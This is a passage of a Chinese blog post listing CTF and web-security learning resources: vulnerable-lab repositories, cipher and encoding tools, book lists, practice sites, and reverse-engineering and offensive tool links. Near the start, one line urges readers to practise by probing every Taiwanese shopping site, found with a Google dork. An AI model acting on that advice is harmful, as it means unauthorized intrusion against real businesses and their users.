靶场：                                         <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.freebuf.com%2Fsectool%2F4708.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/4708.html</a><br> 漏洞靶场，docker搭建，有些靶场内附py文件        <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FMedicean%2FVulApps%2F" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fvulapps.evalbug.com%2F" target="_blank" rel="noopener">http://vulapps.evalbug.com/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecWiki%2FCMS-Hunter" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fklionsec%2FPhishingExploit" target="_blank" rel="noopener">https://github.com/klionsec/PhishingExploit</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vulnspy.com%2F" target="_blank" rel="noopener">http://www.vulnspy.com/</a><br> 上传漏洞靶场：                                 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fupload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a><br> XXE漏洞靶场：                                    <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fxxe-lab" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab</a><br> 一键搭建12个漏洞平台                         <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fvulstudy" target="_blank" rel="noopener">https://github.com/c0ny1/vulstudy</a><br> 各类型漏洞靶场                                 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgh0stkey%2FDoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a><br> AWD环境搭建<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fjjhpkcr.xyz%2F2019%2F04%2F29%2Fawd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%2F%3Fnsukey%3DkcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D" target="_blank" rel="noopener">http://jjhpkcr.xyz/2019/04/29/awd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/?nsukey=kcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D</a></p><p>4、如何学习<br> 多逛论坛：i春秋、吐司、90等等<br> 多看大佬博客<br> 和志同道合的小伙伴一起挖洞</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">想实战检验自己的学习成果，就去把台湾的所有商城网站挖一遍。谷歌语法<span class="selector-pseudo">:site</span>:*<span class="selector-class">.tw</span>商城</span><br><span class="line">挖完了所有商城网站，可以去挖各大<span class="selector-tag">SRC</span>。</span><br></pre></td></tr></table></figure><p>如何入门？如何组队？</p><p>capturetheflag夺旗比赛</p><p>类型：</p><p>Web<br> 密码学<br> xssee:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p><p>xssee:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fevilcos.me%2Flab%2Fxssee" target="_blank" rel="noopener">http://evilcos.me/lab/xssee</a></p><p>(DES,3DES,AES,RC,Blowfish,Twofish,Serpent,Gost,Rijndael,Cast,Xtea,RSA):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ftool.chacuo.net%2Fcryptdes" target="_blank" rel="noopener">http://tool.chacuo.net/cryptdes</a></p><p>在线编码解码(多种并排):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fbianma.911cha.com" target="_blank" rel="noopener">http://bianma.911cha.com</a></p><p>在线加密解密(多种):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fencode.chahuo.com" target="_blank" rel="noopener">http://encode.chahuo.com</a></p><p>Unicode转中文:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com%2Fconvert%2Funicode_chinese" target="_blank" rel="noopener">http://www.bejson.com/convert/unicode_chinese</a></p><p>栅栏密码&amp;&amp;凯撒密码&amp;&amp;摩斯电码:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fheartsnote.com%2Ftools%2Fcipher.htm" target="_blank" rel="noopener">http://heartsnote.com/tools/cipher.htm</a></p><p>Caesarcipher(凯撒密码):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F1434%2F" target="_blank" rel="noopener">http://planetcalc.com/1434/</a></p><p>Quoted-Printable&amp;&amp;ROT13:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.mxcz.net%2Ftools%2FQuotedPrintable.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/QuotedPrintable.aspx</a></p><p>ROT5/13/18/47编码转换:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fbianma%2FROT5-13-18-47.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p><p>Base32/16:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpbaseconverter.com%2F" target="_blank" rel="noopener">http://pbaseconverter.com/</a></p><p>Base32:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Ftools.deamwork.com%2Fcrypt%2Fdecrypt%2Fbase32decode.html" target="_blank" rel="noopener">https://tools.deamwork.com/crypt/decrypt/base32decode.html</a></p><p>quipqiup古典密码自动化爆破(词频分析):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fquipqiup.com%2Findex.php" target="_blank" rel="noopener">http://quipqiup.com/index.php</a></p><p>词频分析/替换:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fcryptoclub.org%2Ftools%2Fcracksub_topframe.php" target="_blank" rel="noopener">http://cryptoclub.org/tools/cracksub_topframe.php</a></p><p>‘+.&lt;&gt;[]’&amp;&amp;’!.?’(Brainfuck/Ook!):<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.splitbrain.org%2Fservices%2Fook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><p>‘+-.&lt;&gt;[]’(Brainfuck):<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.nayuki.io%2Fpage%2Fbrainfuck-interpreter-javascript" target="_blank" rel="noopener">https://www.nayuki.io/page/brainfuck-interpreter-javascript</a></p><p>‘+-.&lt;&gt;[]’(Brainfuck):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fesoteric.sange.fi%2Fbrainfuck%2Fimpl%2Finterp%2Fi.html" target="_blank" rel="noopener">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a></p><p>‘()[]!+’JavaScript编码(JSfuck):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fdiscogscounter.getfreehosting.co.uk%2Fjs-noalnum.php" target="_blank" rel="noopener">http://discogscounter.getfreehosting.co.uk/js-noalnum.php</a></p><p>用6个字符’()[]!+’来编写JavaScript程序(JSfuck同上):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jsfuck.com%2F" target="_blank" rel="noopener">http://www.jsfuck.com/</a></p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpatriciopalladino.com%2Ffiles%2Fhieroglyphy%2F" target="_blank" rel="noopener">http://patriciopalladino.com/files/hieroglyphy/</a></p><p>摩斯密码翻译器:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jb51.net%2Ftools%2Fmorse.htm" target="_blank" rel="noopener">http://www.jb51.net/tools/morse.htm</a></p><p>MorseCode摩尔斯电码:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2Fmorse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a></p><p>摩尔斯电码转换器:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.zhongguosou.com%2Fzonghe%2FmoErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p><p>字符串编码，解码，转换(长度,反转,进制转换):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.5ixuexiwang.com%2Fstr%2F" target="_blank" rel="noopener">http://www.5ixuexiwang.com/str/</a></p><p>CiscoType7Reverser:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpacketlife.net%2Ftoolbox%2Ftype7" target="_blank" rel="noopener">http://packetlife.net/toolbox/type7</a></p><p>Cisco:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ifm.net.nz%2Fcookbooks%2Fpasswordcracker.html" target="_blank" rel="noopener">http://www.ifm.net.nz/cookbooks/passwordcracker.html</a></p><p>cmd5&amp;&amp;NTLM&amp;&amp;mysql…:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cmd5.com" target="_blank" rel="noopener">http://www.cmd5.com</a></p><p>spammimic(字符2一段话):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.spammimic.com%2F" target="_blank" rel="noopener">http://www.spammimic.com/</a></p><p>js代码在线加密解密:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Ftool.lu%2Fjs%2F" target="_blank" rel="noopener">https://tool.lu/js/</a></p><p>JScript/VBscript脚本解密(#@^….^#@):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.dheart.net%2Fdecode%2Findex.php" target="_blank" rel="noopener">http://www.dheart.net/decode/index.php</a></p><p>VBScript.Encode解密(<a href="https://links.jianshu.com/go?to=tip%3AAspencode" target="_blank" rel="noopener">tip:Aspencode):http://adophper.com/encode.html</a>%3Ahttp%3A%2F%2Fadophper.com%2Fencode.html)</p><p>JScript.Encode脚本加密与解密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.haokuwang.com%2Fjsendecode.htm" target="_blank" rel="noopener">http://www.haokuwang.com/jsendecode.htm</a></p><p>‘+/v+’UTF-7加密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p><p>各种无知密码解密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.tools88.com" target="_blank" rel="noopener">http://www.tools88.com</a></p><p>uuencode解码&amp;&amp;xxencode解码(古老的邮件密码):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb.chacuo.net%2Fcharsetuuencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetuuencode</a></p><p>MIME标准(邮件编码的一种):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fdogmamix.com%2FMimeHeadersDecoder%2F" target="_blank" rel="noopener">http://dogmamix.com/MimeHeadersDecoder/</a></p><p>Binhex编码(邮件编码的一种,常见于MAC机):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fencoders-decoders.online-domain-tools.com%2F" target="_blank" rel="noopener">http://encoders-decoders.online-domain-tools.com/</a></p><p>%u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb.chacuo.net%2Fcharsetescape" target="_blank" rel="noopener">http://web.chacuo.net/charsetescape</a></p><p>猪圈密码:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.simonsingh.net%2FThe_Black_Chamber%2Fpigpen.html" target="_blank" rel="noopener">http://www.simonsingh.net/The_Black_Chamber/pigpen.html</a></p><p>ppencode(把Perl代码转换成只有英文字母的字符串):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fnamazu.org%2F~takesako%2Fppencode%2Fdemo.html" target="_blank" rel="noopener">http://namazu.org/~takesako/ppencode/demo.html</a></p><p>aaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Futf-8.jp%2Fpublic%2Faaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a></p><p>‘()[]!+’&amp;&amp;’$=~[]+”_.();’jother编码jjencode(JS代码转换成只有符号的字符串):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p><p>jother（是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：!+()[]{}。只用这些字符就能完成对任意字符串的编码）:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ftmxk.org%2Fjother%2F" target="_blank" rel="noopener">http://tmxk.org/jother/</a></p><p>jjencode/aaencode可用xssee&amp;&amp;Chrome的Console模式来直接输出解密。</p><p>Manchester曼彻斯特解密：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Feleif.net%2Fmanchester.html" target="_blank" rel="noopener">http://eleif.net/manchester.html</a></p><p>Vigenère维多利亚解密：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.guballa.de%2Fvigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p><p>Vigenèrecipher:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F2468%2F" target="_blank" rel="noopener">http://planetcalc.com/2468/</a></p><p>Hillcipher(希尔密码):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F3327%2F" target="_blank" rel="noopener">http://planetcalc.com/3327/</a></p><p>Atbashcipher(埃特巴什码):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F4647%2F" target="_blank" rel="noopener">http://planetcalc.com/4647/</a></p><p>snow(html隐写):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ffog.misty.com%2Fperry%2Fccs%2Fsnow%2Fsnow%2Fsnow.html" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p><p>Serpent加密解密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fserpent.online-domain-tools.com%2F" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p>十六进制Hex转文本字符串:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com%2Fconvert%2Fox2str%2F" target="_blank" rel="noopener">http://www.bejson.com/convert/ox2str/</a></p><p>Hex2text:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.convertstring.com%2FEncodeDecode%2FHexDecode" target="_blank" rel="noopener">http://www.convertstring.com/EncodeDecode/HexDecode</a></p><p>Binary(二进制)，ACSII,Hex(十六进制),Decimal(十进制):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.binaryhexconverter.com%2F" target="_blank" rel="noopener">http://www.binaryhexconverter.com/</a></p><p>集合:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fdaohang.htm" target="_blank" rel="noopener">http://www.qqxiuzi.cn/daohang.htm</a></p><p>集合（各种古典密码）:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2F" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/</a></p><p>文本加密为汉字(“盲文”，音符，各种语言，花朵，箭头…):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fbianma%2Fwenbenjiami.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/wenbenjiami.php</a></p><p>在线繁体字转换器:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.aies.cn" target="_blank" rel="noopener">http://www.aies.cn</a></p><p>在线工具集合:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ftomeko.net%2Fonline_tools%2F" target="_blank" rel="noopener">http://tomeko.net/online_tools/</a></p><p>二维码/条形码:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fonline-barcode-reader.inliteresearch.com%2F" target="_blank" rel="noopener">https://online-barcode-reader.inliteresearch.com/</a></p><p>生成二维码:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wwei.cn%2F" target="_blank" rel="noopener">http://www.wwei.cn/</a></p><p>在线二维码解密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fjiema.wwei.cn%2F" target="_blank" rel="noopener">http://jiema.wwei.cn/</a></p><p>Image2Base64:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vgot.net%2Ftest%2Fimage2base64.php" target="_blank" rel="noopener">http://www.vgot.net/test/image2base64.php</a></p><p>与佛论禅:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.keyfc.net%2Fbbs%2Ftools%2Ftudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p>在线分解GIF帧图:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fzh.bloggif.com%2Fgif-extract" target="_blank" rel="noopener">http://zh.bloggif.com/gif-extract</a></p><p>bejson(杂乱):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com" target="_blank" rel="noopener">http://www.bejson.com</a></p><p>atool(杂乱):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.atool.org" target="_blank" rel="noopener">http://www.atool.org</a></p><p>PunchCard:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.kloth.net%2Fservices%2Fcardpunch.php" target="_blank" rel="noopener">http://www.kloth.net/services/cardpunch.php</a></p><p>分解素数(ESA):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.factordb.com%2Findex.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a></p><p>文件在线Hash:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.atool.org%2Ffile_hash.php" target="_blank" rel="noopener">http://www.atool.org/file_hash.php</a><br> pwn程序的逻辑分析，漏洞利用windows、linux、小型机等<br> misc杂项，隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据<br> reverse逆向windows、linux类<br> ppc编程类的</p><p>国内外著名比赛</p><p>国外：<br> 国内：xctf联赛0ctf上海国内外都有，很强</p><p>入门需要哪些基础：</p><p>1.编程语言基础（c、汇编、脚本语言）<br> 2.数学基础（算法、密码学）<br> 3.脑洞大开（天马行空的想象、推理解密）<br> 4.体力耐力（通宵熬夜）</p><p>如何入门学</p><p>1.恶补基础知识<br> 2.尝试从脑洞开始如黑客game<br> 3.从基础题出发一般都是100，200，最高分在500，600先把100分的学好，可从实践，高中的ctf学起，比较简单，只涉及1，2个点<br> 4.学信息安全专业知识<br> 5.锻炼体力耐力周六日都有比赛</p><p>到底如何学？</p><p>1.分析赛题情况<br> 2.分析自身能力自己最适合哪个方向<br> 3.选择更适合的入手</p><p>分析赛题</p><p>PWN、Reverse偏重对汇编、逆向的理解对底层理解<br> Crypto偏重对数学、算法的深入学习密码课要深入学<br> Web偏重对技巧沉淀、快速搜索能力的挑战发散思维，对底层只需要了解，代码原理，关于漏洞点的积累<br> Misc则更复杂，所有与计算机安全挑战有关的都在其中隐写，图片数据分析还原，流量，大数据，对游戏分析逆向</p><p>常规做法：</p><p>A方向：PWN+Reverse+Crypto随机搭配<br> B方向：Web+Misc组合<br> Misc所有人都可以做</p><p>入门知识：</p><p>都要学的内容：linux基础、计算机组成原理、操作系统原理、网络协议分析</p><p>A方向：IDA工具使用（fs插件）、逆向工程、密码学、缓冲区溢出等<br> B方向：Web安全、网络安全、内网渗透、数据库安全等前10的安全漏洞</p><p>推荐书：</p><p>A方向：</p><p>REforBeginners<br> IDAPro权威指南<br> 揭秘家庭路由器0day漏洞挖掘技术<br> 自己定操作系统<br> 黑客攻防技术宝典：系统实战篇有各种系统的逆向讲解</p><p>B方向：</p><p>Web应用安全权威指南最推荐小白，宏观web安全<br> Web前端黑客技术揭秘<br> 黑客秘籍——渗透测试实用指南<br> 黑客攻防技术宝典web实战篇web安全的所有核心基础点，有挑战性，最常规，最全，学好会直线上升<br> 代码审计：企业级web代码安全架构</p><p>入门—-从基础题目出发（推荐资源）：</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fctf.idf.cn" target="_blank" rel="noopener">http://ctf.idf.cn</a>!!!首推idf实验室：题目非常基础，只1个点<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ichunqiu.com" target="_blank" rel="noopener">www.ichunqiu.com</a>有线下决赛题目复现<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Foj.xctf.org.cn%2Fxctf" target="_blank" rel="noopener">http://oj.xctf.org.cn/xctf</a>题库网站，历年题，练习场，比较难<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wechall.net%2Fchalls" target="_blank" rel="noopener">www.wechall.net/challs</a>!!!!!!非常入门的国外ctf题库，很多国内都是从这里刷题成长起来的<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fcanyouhack.it%2F" target="_blank" rel="noopener">http://canyouhack.it/</a>国外，入门，有移动安全<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmicrocorruption.com%2FloginA" target="_blank" rel="noopener">https://microcorruption.com/loginA</a>方向密码，逆向酷炫游戏代<br> http：//smashthestack.orgA方向，简洁，国外，wargames，过关<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Foverthewire.ofg%2Fwargames%2F" target="_blank" rel="noopener">http://overthewire.ofg/wargames/</a>！！！！推荐A方向国内资料多，老牌wargame<br> https：//exploit-exercises.comA方向老牌wargame，国内资料多<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpawnable.kr%2Fplay.phppwn" target="_blank" rel="noopener">http://pawnable.kr/play.phppwn</a>类游乐场，不到100题<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fctf.moonsoscom%2Fpentest%2Findex.phpB" target="_blank" rel="noopener">http://ctf.moonsoscom/pentest/index.phpB</a>方向米安的Web漏洞靶场，基础，核心知识点<br> http：//prompt.ml/0B方向国外的xss测试<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fredtiger.labs.overthewire.org%2FB" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org/B</a>方向国外sql注入挑战网站，10关，过关的形式不同的注入，循序渐近地练习</p><p>工具：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftruongkma%2Fctf-tools" target="_blank" rel="noopener">https://github.com/truongkma/ctf-tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPlkachu%2Fv0lt" target="_blank" rel="noopener">https://github.com/Plkachu/v0lt</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzardus%2Fctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTUCTF%2FTools" target="_blank" rel="noopener">https://github.com/TUCTF/Tools</a></p><p>入门–以练促赛，以赛养练</p><p>选择一场已经存在writeup的比赛</p><p>总结解题过程，分析出题人想法</p><p>参加一场最新的ctf比赛<br> https：//ctftime.org/国际比赛，有很多基础的<br> http：<a href="https://links.jianshu.com/go?to=%2F%2Fwww.xctf.org.cn%2F" target="_blank" rel="noopener">//www.xctf.org.cn/</a>国内比赛，比较难<br> 以及一些ctf要用到的<br> 整合版：</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jz5u.com%2FSoft%2FProgra%2Ftool%2F163275.html" target="_blank" rel="noopener">http://www.jz5u.com/Soft/Progra/tool/163275.html</a></p><p>各种在线工具以及工具整合</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ctftools.com%2F" target="_blank" rel="noopener">http://www.ctftools.com/</a></p><p>内网自动化渗透脚本<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecureThisShit%2FWinPwn" target="_blank" rel="noopener">https://github.com/SecureThisShit/WinPwn</a></p><p>一个初级内网渗透课程<br> 视频:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F13yBZg6DaaMP_dRo1XhKooA" target="_blank" rel="noopener">https://pan.baidu.com/s/13yBZg6DaaMP_dRo1XhKooA</a>提取码：aeko<br> PPT:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F13r6dH0GBbsuLVFP4nTg5Yg" target="_blank" rel="noopener">https://pan.baidu.com/s/13r6dH0GBbsuLVFP4nTg5Yg</a>提取码：fuh8逆向工程:<br> GDB–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgdb%2Fdownload%2F" target="_blank" rel="noopener">http://www.gnu.org/software/gdb/download/</a><br> IDAPro–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.hex-rays.com%2Fproducts%2Fida%2Fsupport%2Fdownload.shtml" target="_blank" rel="noopener">https://www.hex-rays.com/products/ida/support/download.shtml</a><br> ImmunityDebugger–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fdebugger.immunityinc.com%2F" target="_blank" rel="noopener">http://debugger.immunityinc.com/</a><br> OllyDbg–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ollydbg.de%2F" target="_blank" rel="noopener">http://www.ollydbg.de/</a><br> radare2–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.radare.org%2Fy%2F%3Fp%3Ddownload" target="_blank" rel="noopener">http://www.radare.org/y/?p=download</a><br> Hopper–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.hopperapp.com%2Fdownload.html" target="_blank" rel="noopener">http://www.hopperapp.com/download.html</a><br> nm–unix/linuxtool<br> objdump–linuxtool<br> strace–linuxtool<br> ILSpy–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Filspy.net%2F" target="_blank" rel="noopener">http://ilspy.net/</a><br> JD-GUI–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F%23jd-gui-overview" target="_blank" rel="noopener">http://jd.benow.ca/#jd-gui-overview</a><br> FFDec–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.free-decompiler.com%2Fflash%2Fdownload.html" target="_blank" rel="noopener">http://www.free-decompiler.com/flash/download.html</a><br> dex2jar–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fcode.google.com%2Fp%2Fdex2jar%2F" target="_blank" rel="noopener">http://code.google.com/p/dex2jar/</a><br> uncompyle2–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwibiti%2Funcompyle2" target="_blank" rel="noopener">https://github.com/wibiti/uncompyle2</a><br> Hexeditors:<br> Windows:<br> HxD–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fmh-nexus.de%2Fen%2Fhxd%2F" target="_blank" rel="noopener">http://mh-nexus.de/en/hxd/</a><br> Neo–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.new-hex-editor.com%2Fhex-editor-downloads.html" target="_blank" rel="noopener">http://www.new-hex-editor.com/hex-editor-downloads.html</a><br> Linux:<br> Bless–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fhome.gna.org%2Fbless%2Fdownloads.html" target="_blank" rel="noopener">http://home.gna.org/bless/downloads.html</a><br> wxHexEditor–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wxhexeditor.org%2Fdownload.php" target="_blank" rel="noopener">http://www.wxhexeditor.org/download.php</a><br> Exeunpackers–UnpackingKit2012–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fforum.exetools.com%2Fshowthread.php%3Ft%3D13610" target="_blank" rel="noopener">http://forum.exetools.com/showthread.php?t=13610</a></p><p>网络:<br> Wireshark,tshark–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.wireshark.org%2Fdownload.html" target="_blank" rel="noopener">https://www.wireshark.org/download.html</a><br> OpenVPN–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fopenvpn.net%2F" target="_blank" rel="noopener">https://openvpn.net/</a><br> OpenSSL–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.openssl.org%2Frelated%2Fbinaries.html" target="_blank" rel="noopener">https://www.openssl.org/related/binaries.html</a><br> tcpdump–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.tcpdump.org%2F" target="_blank" rel="noopener">http://www.tcpdump.org/</a><br> netcat–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fnetcat.sourceforge.net%2F" target="_blank" rel="noopener">http://netcat.sourceforge.net/</a><br> nmap–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fnmap.org%2Fdownload.html" target="_blank" rel="noopener">http://nmap.org/download.html</a></p><p>隐写:<br> OpenStego–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.openstego.info%2F" target="_blank" rel="noopener">http://www.openstego.info/</a><br> OutGuess–<a 